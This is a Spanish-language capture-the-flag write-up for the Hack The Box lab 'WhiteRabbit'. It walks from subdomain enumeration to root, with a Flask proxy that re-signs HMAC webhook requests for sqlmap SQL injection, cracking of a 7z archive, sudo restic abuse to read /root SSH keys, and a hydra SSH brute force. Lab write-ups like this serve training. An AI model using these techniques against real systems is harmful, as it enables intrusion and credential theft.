---
tags:
title: WhiteRabbit - Insane (HTB)
permalink: /WhiteRabbit-HTB-Writeup
toc: true
toc_label: Topics
toc_sticky: true
sidebar: main
---
---
# Reconocimiento

```bash 
nmap -sCV -p22,80,2222 10.10.11.63                                      
Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-02 12:49 -03
Nmap scan report for 10.10.11.63
Host is up (0.59s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.9 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 0f:b0:5e:9f:85:81:c6:ce:fa:f4:97:c2:99:c5:db:b3 (ECDSA)
|_  256 a9:19:c3:55:fe:6a:9a:1b:83:8f:9d:21:0a:08:95:47 (ED25519)
80/tcp   open  http    Caddy httpd
|_http-server-header: Caddy
|_http-title: Did not follow redirect to http://whiterabbit.htb
2222/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 c8:28:4c:7a:6f:25:7b:58:76:65:d8:2e:d1:eb:4a:26 (ECDSA)
|_  256 ad:42:c0:28:77:dd:06:bd:19:62:d8:17:30:11:3c:87 (ED25519)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 43.32 seconds
```

Agregamos el dominio al `/etc/hosts`

```bash 
sudo echo "10.10.11.63 whiterabbit.htb"
```

![Pasted image 20250902125901](images/Pasted image 20250902125901.png)
Vemos que en la pagina principal no hay nada de nada, asi que nos ponemos a enumerar por subdominios con la herramienta `gobuster`.

```bash 
gobuster vhost -u http://whiterabbit.htb -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -t 150 --append-domain
===============================================================
Gobuster v3.8
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                       http://whiterabbit.htb
[+] Method:                    GET
[+] Threads:                   150
[+] Wordlist:                  /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt
[+] User Agent:                gobuster/3.8
[+] Timeout:                   10s
[+] Append Domain:             true
[+] Exclude Hostname Length:   false
===============================================================
Starting gobuster in VHOST enumeration mode
===============================================================
status.whiterabbit.htb Status: 302 [Size: 32] [--> /dashboard]
```

Agregamos el nuevo subdominio encontrado al `/etc/hosts`

```bash 
echo "10.10.11.63 status.whiterabbit.htb"
```

```bash 
gobuster dir -u http://status.whiterabbit.htb -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-big.txt -t 200 -x php,txt,js,zip,bak,php.bak --exclude-length 2444 
===============================================================
Gobuster v3.8
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://status.whiterabbit.htb
[+] Method:                  GET
[+] Threads:                 200
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-big.txt
[+] Negative Status codes:   404
[+] Exclude Length:          2444
[+] User Agent:              gobuster/3.8
[+] Extensions:              php,txt,js,zip,bak,php.bak
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/screenshots          (Status: 301) [Size: 189] [--> /screenshots/]
/assets               (Status: 301) [Size: 179] [--> /assets/]
/upload               (Status: 301) [Size: 179] [--> /upload/]
/robots.txt           (Status: 200) [Size: 25]
/Screenshots          (Status: 301) [Size: 189] [--> /Screenshots/]
/metrics              (Status: 401) [Size: 0]
/Upload               (Status: 301) [Size: 179] [--> /Upload/]
Progress: 152440 / 8916817 (1.71%)^C
```
![Pasted image 20250902130419](images/Pasted image 20250902130419.png)


```bash 
wfuzz -c -t 200 -u http://status.whiterabbit.htb/FUZZ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-big.txt --hc=200,302 
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://status.whiterabbit.htb/FUZZ
Total requests: 1273832

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                                   
=====================================================================
     
000000766:   404        38 L     143 W      2444 Ch     "status"
```

```bash 
wfuzz -c -t 200 -u http://status.whiterabbit.htb/status/FUZZ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-big.txt --hh=2444

000001468:   200        40 L     152 W      3359 Ch     "temp"
```

![Pasted image 20250902131827](images/Pasted image 20250902131827.png)

http://a668910b5514e.whiterabbit.htb/en/gophish_webhooks

Vemos un nuevo host para agregar el `/etc/hosts` y un link que nos descarga un `.json`.

![Pasted image 20250902150056](images/Pasted image 20250902150056.png)

El contenido de archivo `json` muestra un `workflow exportado` en `json` el cual recibe eventos de n8n y actualiza la base de datos `victim` en `maria-db` o `mysql`.Dentro del archivo vemos una clave secreta. Esta clave permite generar firmas válidas para cualquier payload, lo que nos da la posibilidad de interactuar con el webhook de manera controlada.

```json 
{
      "parameters": {
        "action": "hmac",
        "type": "SHA256",
        "value": "={{ JSON.stringify($json.body) }}",
        "dataPropertyName": "calculated_signature",
        "secret": "3CWVGMndgMvdVAzOjqBiTicmv7gxc6IS"
      },

```
Esa clave lo que hace es que cuando el `Chekpoint Gopish Header` valida si el request trae un header `x-gopish-signature` el cual despues `Extract siganture` y `Calculate the signature` calculan un `HMAC SHA-256` con la clave secreta lo que ayuda a la validacion de que si la request venga realmente de `Gopish`.

Para automatizar el proceso y facilitar pruebas de inyección SQL, se implementó un script en Python con la siguiente lógica:

- Generación dinámica de la firma HMAC
- Envío de payloads al webhook
- Automatizacion de pruebas con `sqlmap`, donde se levanta un proxy local que recibe las solicitudes de sqlmap, donde en cada cada intento de inyección en el campo email, el proxy recalcula la firma HMAC y reenvía el request al webhook real.

```python
#!/usr/bin/env python3
import hmac
import hashlib
import json
import subprocess
from flask import Flask, request, jsonify
import threading

app = Flask(__name__)

TARGET_URL = "http://28efa8f7df.whiterabbit.htb/webhook/d96af3a4-21bd-4bcb-bd34-37bfc67dfd1d"
SECRET_KEY = "3CWVGMndgMvdVAzOjqBiTicmv7gxc6IS"  # clave de Gophish

def makesig(email):
    body = {
        "campaign_id": 1,
        "email": email,
        "message": "Clicked Link"
    }
    # JSON ordenado y sin espacios extra
    body_bytes = json.dumps(body, separators=(',', ':'), sort_keys=True).encode()
    key_bytes = SECRET_KEY.encode()
    signature = hmac.new(key_bytes, body_bytes, hashlib.sha256).hexdigest()
    return "sha256=" + signature

@app.route('/test', methods=['GET'])
def handle_payload():
    q = request.args.get('q')
    if not q:
        return jsonify({"error": "Missing parameter 'q'"}), 400

    # Genera payload con firma
    body = {
        "campaign_id": 1,
        "email": q,
        "message": "Clicked Link"
    }
    body_bytes = json.dumps(body, separators=(',', ':'), sort_keys=True).encode()
    headers = {
        "Content-Type": "application/json",
        "x-gophish-signature": makesig(q)
    }

    try:
        import requests
        resp = requests.post(TARGET_URL, data=body_bytes, headers=headers)
        return resp.text
    except Exception as e:
        return jsonify({"error": str(e)}), 500

def run_flask():
    app.run(host='0.0.0.0', port=5000)

def run_sqlmap():
    # Ejecuta sqlmap apuntando al Flask server
    subprocess.run([
        "sqlmap",
        "-u", "http://127.0.0.1:5000/test?q=test@example.com",
        "-p", "q",
        "-D", "temp",
        "-T", "command_log",
        "--dump",
        "--batch",
        "-f"
    ])

if __name__ == "__main__":
    # Levanta Flask en un hilo para que sqlmap pueda ejecutarse
    flask_thread = threading.Thread(target=run_flask)
    flask_thread.daemon = True
    flask_thread.start()

    # Espera 2 segundos para que Flask esté listo
    import time
    time.sleep(2)

    # Ejecuta sqlmap
    run_sqlmap()

```

``Aclaracion: Anteriormente use el mismo script para descubrir la base de datos 'tmp' y la tabla 'command_log' de la cual puedo dumpear lo siguientes datos`` 

Lo corremos.

```bash 
python3 dump.py
```

Y vemos credenciales de un repositorio de `restic`
```bash 
Database: temp
Table: command_log
[6 entries]
+----+---------------------+------------------------------------------------------------------------------+
| id | date                | command                                                                      |
+----+---------------------+------------------------------------------------------------------------------+
| 1  | 2024-08-30 10:44:01 | uname -a                                                                     |
| 2  | 2024-08-30 11:58:05 | restic init --repo rest:http://75951e6ff.whiterabbit.htb                     |
| 3  | 2024-08-30 11:58:36 | echo ygcsvCuMdfZ89yaRLlTKhe5jAmth7vxw > .restic_passwd                       |
| 4  | 2024-08-30 11:59:02 | rm -rf .bash_history                                                         |
| 5  | 2024-08-30 11:59:47 | #thatwasclose                                                                |
| 6  | 2024-08-30 14:40:42 | cd /home/neo/ && /opt/neo-password-generator/neo-password-generator | passwd |
+----+---------------------+------------------------------------------------------------------------------+

[15:57:27] [INFO] table 'temp.command_log' dumped to CSV file '/root/.local/share/sqlmap/output/127.0.0.1/dump/temp/command_log.csv'
[15:57:27] [INFO] fetched data logged to text files under '/root/.local/share/sqlmap/output/127.0.0.1'
```

Con las credenciales podemos ver el contenido del mismo repositorio. Para ello exportamos su password como la variable de entorno

```bash
export RESTIC_PASSWORD="ygcsvCuMdfZ89yaRLlTKhe5jAmth7vxw" 
```

Y luego con `restic` vemos el contenido del repositorio.

```bash
restic -r rest:http://75951e6ff.whiterabbit.htb snapshots

repository 5b26a938 opened (version 2, compression level auto)
ID        Time                 Host         Tags        Paths
------------------------------------------------------------------------
272cacd5  2025-03-06 21:18:40  whiterabbit              /dev/shm/bob/ssh
------------------------------------------------------------------------
1 snapshots
```

Para extraer el contenido primero metemos las password del repositorio dentro de un archivo y luego extraemos el contenido en nuestro equipo.

```bash 
echo "ygcsvCuMdfZ89yaRLlTKhe5jAmth7vxw" > restic_passwd.txt
```

```bash 
restic -r rest:http://75951e6ff.whiterabbit.htb -p restic_passwd.txt restore 272cacd5 --target /home/zsln/Desktop/zsln/htb/whiterabbit/restic_restore

repository 5b26a938 opened (version 2, compression level auto)
[0:00] 100.00%  5 / 5 index files loaded
restoring snapshot 272cacd5 of [/dev/shm/bob/ssh] at 2025-03-06 17:18:40.024074307 -0700 -0700 by ctrlzero@whiterabbit to /home/zsln/Desktop/zsln/htb/whiterabbit/restic_restore
Summary: Restored 5 files/dirs (572 B) in 0:00
```

```bash 
ls -la /dev/shm/bob/ssh     
total 16
drwxr-xr-x 2 root root 4096 Sep  2 16:39 .
drwxr-xr-x 3 root root 4096 Mar  6 21:10 ..
-rw-r--r-- 1 root root  572 Mar  6 21:12 bob.7z
```

Lo descomprimimos pero vemos que esta protegido con contraseña.
```bash 
7z x bob.7z

7-Zip 25.01 (x64) : Copyright (c) 1999-2025 Igor Pavlov : 2025-08-03
 64-bit locale=en_US.UTF-8 Threads:128 OPEN_MAX:1024, ASM

Scanning the drive for archives:
1 file, 572 bytes (1 KiB)

Extracting archive: bob.7z
--
Path = bob.7z
Type = 7z
Physical Size = 572
Headers Size = 204
Method = LZMA2:12 7zAES
Solid = +
Blocks = 1

    
Enter password (will not be echoed):
```

Si probamos con la misma contraseña del repositorio vemos que es un intento fallido, por lo que convertimos el `7z` a un hash compatible con alguna herramienta de cracking, como en este caso yo uso `JohnTheRipper`.

```bash 
7z2john bob.7z > bob.hash
```

```bash 
cat bob.hash 
bob.7z:$7z$2$19$0$$8$61d81f6f9997419d0000000000000000$4049814156$368$365$7295a784b0a8cfa7d2b0a8a6f88b961c8351682f167ab77e7be565972b82576e7b5ddd25db30eb27137078668756bf9dff5ca3a39ca4d9c7f264c19a58981981486a4ebb4a682f87620084c35abb66ac98f46fd691f6b7125ed87d58e3a37497942c3c6d956385483179536566502e598df3f63959cf16ea2d182f43213d73feff67bcb14a64e2ecf61f956e53e46b17d4e4bc06f536d43126eb4efd1f529a2227ada8ea6e15dc5be271d60360ff5c816599f0962fc742174ff377e200250b835898263d997d4ea3ed6c3fc21f64f5e54f263ebb464e809f9acf75950db488230514ee6ed92bd886d0a9303bc535ca844d2d2f45532486256fbdc1f606cca1a4680d75fa058e82d89fd3911756d530f621e801d73333a0f8419bd403350be99740603dedff4c35937b62a1668b5072d6454aad98ff491cb7b163278f8df3dd1e64bed2dac9417ca3edec072fb9ac0662a13d132d7aa93ff58592703ec5a556be2c0f0c5a3861a32f221dcb36ff3cd713$399$00
```

Lo crackeamos con `John`.

```bash 
john bob.hash --wordlist=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (7z, 7-Zip archive encryption [SHA256 512/512 AVX512BW 16x AES])
Cost 1 (iteration count) is 524288 for all loaded hashes
Cost 2 (padding size) is 3 for all loaded hashes
Cost 3 (compression type) is 2 for all loaded hashes
Cost 4 (data length) is 365 for all loaded hashes
Will run 12 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
1q2w3e4r5t6y     (bob.7z)     
1g 0:00:01:19 DONE (2025-09-02 16:40) 0.01252g/s 300.6p/s 300.6c/s 300.6C/s 231086..millers
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

Obtenemos la contraseña del archivo `7z`.

`1q2w3e4r5t6y`

Vemos que el archivo `bob` contiene una clave privada de `ssh` con la que podemos loguearnos por el puerto `2222` como dice en el archivo `config`.

```bash 
cat bob     
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW
QyNTUxOQAAACBvDTUyRwF4Q+A2imxODnY8hBTEGnvNB0S2vaLhmHZC4wAAAJAQ+wJXEPsC
VwAAAAtzc2gtZWQyNTUxOQAAACBvDTUyRwF4Q+A2imxODnY8hBTEGnvNB0S2vaLhmHZC4w
AAAEBqLjKHrTqpjh/AqiRB07yEqcbH/uZA5qh8c0P72+kSNW8NNTJHAXhD4DaKbE4OdjyE
FMQae80HRLa9ouGYdkLjAAAACXJvb3RAbHVjeQECAwQ=
-----END OPENSSH PRIVATE KEY-----
```

```bash 
cat config         
Host whiterabbit
  HostName whiterabbit.htb
  Port 2222
  User bob
```

Le damos permisos de lectura al `bob` para usarlo como clave de identidad para loguearnos por `ssh`.

```bash 
chmod 600 bob 
```

Nos logueamos via `ssh`.

```bash 
ssh bob@whiterabbit.htb -p 2222 -i bob
The authenticity of host '[whiterabbit.htb]:2222 ([10.10.11.63]:2222)' can't be established.
ED25519 key fingerprint is SHA256:jWKKPrkxU01KGLZeBG3gDZBIqKBFlfctuRcPBBG39sA.
This host key is known by the following other names/addresses:
    ~/.ssh/known_hosts:39: [hashed name]
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '[whiterabbit.htb]:2222' (ED25519) to the list of known hosts.
Welcome to Ubuntu 24.04 LTS (GNU/Linux 6.8.0-57-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

This system has been minimized by removing packages and content that are
not required on a system that users do not log into.

To restore this content, you can run the 'unminimize' command.
Last login: Mon Mar 24 15:40:49 2025 from 10.10.14.62'
bob@ebdce80611e9:~$
```

Vemos que tenemos privilegios `SUDOERS`en restic
```bash 
sudo -l
Matching Defaults entries for bob on ebdce80611e9:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User bob may run the following commands on ebdce80611e9:
    (ALL) NOPASSWD: /usr/bin/restic
```

Asi para explotar y escapar del container creamos un repositorio y despues volcamos el contenido de `/root/` en el para ver que pueda tener 

```bash 
sudo /usr/bin/restic init --repo /tmp/test
enter password for new repository: 
enter password again: 
```

Le ponemos la password `lala123` y ahora pasamos a crear un backup del directorio de `/root` en nuestro repositorio.

```bash 
sudo /usr/bin/restic --repo /tmp/test backup /root/
```

Y ahora listamos el contenido de la ultima `snapshot`.

```bash 
sudo /usr/bin/restic -r /tmp/test/ ls latest
enter password for repository: 
repository 3344c57a opened (version 2, compression level auto)
[0:00] 100.00%  1 / 1 index files loaded
snapshot 33cd0523 of [/root] filtered by [] at 2025-09-02 20:18:26.240593928 +0000 UTC):
/root
/root/.bash_history
/root/.bashrc
/root/.cache
/root/.profile
/root/.ssh
/root/morpheus
/root/morpheus.pub
```

Vemos que en el directorio de `root`hay algo sobre el usario `morpheus` que como vemos que hay un `.pub` que sabemos que es una clave ssh publica, puede que el `/root/morpheus` sea la privada, asi que con el comando `dump` volvamos el contenido de dicha ruta.

```bash 
sudo /usr/bin/restic --repo /tmp/test dump latest /root/morpheus
enter password for repository: 
repository 3344c57a opened (version 2, compression level auto)
[0:00] 100.00%  1 / 1 index files loaded
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAaAAAABNlY2RzYS
1zaGEyLW5pc3RwMjU2AAAACG5pc3RwMjU2AAAAQQS/TfMMhsru2K1PsCWvpv3v3Ulz5cBP
UtRd9VW3U6sl0GWb0c9HR5rBMomfZgDSOtnpgv5sdTxGyidz8TqOxb0eAAAAqOeHErTnhx
K0AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBL9N8wyGyu7YrU+w
Ja+m/e/dSXPlwE9S1F31VbdTqyXQZZvRz0dHmsEyiZ9mANI62emC/mx1PEbKJ3PxOo7FvR
4AAAAhAIUBairunTn6HZU/tHq+7dUjb5nqBF6dz5OOrLnwDaTfAAAADWZseEBibGFja2xp
c3QBAg==
-----END OPENSSH PRIVATE KEY-----
```

Vemos que si asi que el contenido lo ingresamos dentro de nuestra maquina en un archivo con nombre `morpheus_key` y le damos permisos de lectura para usarlo nuevamente como clave de identidad.

```bash 
chmod 600 morpheus_key
```

Nos logueamos como dicho usuario.
```bash 
ssh morpheus@whiterabbit.htb -i morpheus_key 
The authenticity of host 'whiterabbit.htb (10.10.11.63)' can't be established.
ED25519 key fingerprint is SHA256:F9XNz/rgt655Q1XKkL6at11Zy5IXAogAEH95INEOrIE.
This host key is known by the following other names/addresses:
    ~/.ssh/known_hosts:38: [hashed name]
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes 
Warning: Permanently added 'whiterabbit.htb' (ED25519) to the list of known hosts.
Welcome to Ubuntu 24.04.2 LTS (GNU/Linux 6.8.0-57-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

This system has been minimized by removing packages and content that are
not required on a system that users do not log into.

To restore this content, you can run the 'unminimize' command.
Last login: Tue Sep 2 20:29:38 2025 from 10.10.16.25'
morpheus@whiterabbit:~$
```

```bash 
hydra -l neo -P passwords.txt  ssh://whiterabbit.htb -t 40
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-09-02 18:09:50
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 40 tasks per 1 server, overall 40 tasks, 1000 login tries (l:1/p:1000), ~25 tries per task
[DATA] attacking ssh://whiterabbit.htb:22/
[STATUS] 348.00 tries/min, 348 tries in 00:01h, 671 to do in 00:02h, 21 active
[STATUS] 300.50 tries/min, 601 tries in 00:02h, 418 to do in 00:02h, 21 active
[22][ssh] host: whiterabbit.htb   login: neo   password: WBSxhWgfnMiclrV4dqfj
1 of 1 target successfully completed, 1 valid password found
[WARNING] Writing restore file because 19 final worker threads did not complete until end.
[ERROR] 19 targets did not resolve or could not be connected
[ERROR] 0 target did not complete
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-09-02 18:12:07
```

```bash 
ssh neo@whiterabbit.htb
neo@whiterabbit.htbs password: 
neo@whiterabbit:~$ sudo su 
[sudo] password for neo: 
root@whiterabbit:/home/neo#
```
